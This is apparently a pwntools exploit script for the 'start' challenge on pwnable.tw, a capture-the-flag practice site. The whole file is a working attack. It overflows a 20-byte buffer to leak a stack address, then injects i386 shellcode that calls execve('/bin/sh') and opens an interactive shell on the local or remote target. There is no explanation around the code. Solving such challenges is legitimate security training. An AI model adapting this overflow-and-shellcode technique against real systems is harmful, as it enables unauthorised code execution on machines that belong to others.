#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10000
HOST = "chall.pwnable.tw"
exe = context.binary = ELF('./start', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

start_write = 0x08048087

offset = 20
pl = flat(
	b'A'*offset,
	start_write
	)
# input()
p.sendafter(b"CTF:", pl)
stack_leak = u32(p.recv(4))
log.info("stack_leak: " + hex(stack_leak))

sc = asm('''
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	mov al, 0xb
	int 0x80
	''', arch = 'i386')

input()

pl = sc.ljust(20) + p32(stack_leak - 0x04) + b"/bin/sh\0"
p.send(pl)

p.interactive()